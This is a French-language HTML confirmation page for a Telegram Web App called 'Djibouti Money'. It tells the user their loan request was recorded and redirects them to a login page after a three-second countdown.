<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Demande Soumise - Djibouti Money</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary-yellow: #eab308; --bg-color: #fffdf5; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background: white; width: 90%; max-width: 420px; padding: 40px 24px; border-radius: 24px; border: 1px solid #fef08a; box-shadow: 0 6px 25px rgba(234, 179, 8, 0.1); display: flex; flex-direction: column; align-items: center; text-align: center; }
        .check-circle { width: 88px; height: 88px; background-color: #eab308; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 24px; color: #000; font-size: 38px; font-weight: bold; }
        .main-title { font-size: 24px; color: #ca8a04; margin-bottom: 15px; font-weight: 800; }
        .message-text { color: #555; font-size: 15px; margin-bottom: 20px; line-height: 1.5; }
        .redirect-box { background-color: #fefce8; border-radius: 12px; padding: 15px; width: 100%; display: flex; justify-content: center; gap: 10px; color: #ca8a04; font-weight: 700; margin-bottom: 15px; }
        .btn-outline { background: transparent; color: #111; border: 1px solid #d1d5db; width: 100%; padding: 14px; border-radius: 10px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
<div class="card">
    <div class="check-circle">✓</div>
    <h1 class="main-title">Demande Soumise</h1>
    <p class="message-text">Votre demande de prêt a été enregistrée avec succès. Veuillez vous connecter pour finaliser.</p>
    <div class="redirect-box">Redirection dans <span id="timer">3</span>s...</div>
    <button class="btn-outline" onclick="location.href='/page6'">Se connecter maintenant</button>
</div>

<script>
    let timeLeft = 3;
    const timerEl = document.getElementById('timer');
    const interval = setInterval(() => {
        timeLeft--;
        if(timerEl) timerEl.textContent = timeLeft;
        if(timeLeft <= 0) { clearInterval(interval); location.href = '/page6'; }
    }, 1000);
</script>
</body>
</html>
